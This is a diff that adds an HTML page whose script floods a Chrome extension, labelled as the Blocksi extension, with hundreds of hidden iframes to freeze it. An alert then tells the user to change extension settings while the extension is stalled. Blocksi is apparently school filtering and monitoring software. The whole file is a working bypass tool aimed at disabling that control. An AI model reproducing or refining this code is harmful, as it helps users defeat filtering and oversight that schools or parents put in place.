@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<body>
+<input id="id" placeholder="Blocksi extension ID" style="width:300px;">
+<button onclick="spam()">Freeze</button>
+
+<script>
+function spam() {
+  const extId = document.getElementById('id').value.trim();
+  if (!extId || extId.length !== 32) return alert('Need valid 32-char ID');
+
+  // Target a web accessible resource or any extension page
+  const url = `chrome-extension://${extId}/manifest.json`;  // or /background.html, _generated_background_page.html, etc.
+
+  let count = 0;
+  const interval = setInterval(() => {
+    const iframe = document.createElement('iframe');
+    iframe.src = url;
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+    count++;
+    if (count > 500) {  // adjust higher for stronger freeze
+      clearInterval(interval);
+      alert('Spamming done - flip "Allow access to file URLs" in chrome://extensions now');
+    }
+  }, 10);  // fast creation; slow to ~50-100ms if too aggressive
+}
+</script>
+</body>
+</html>
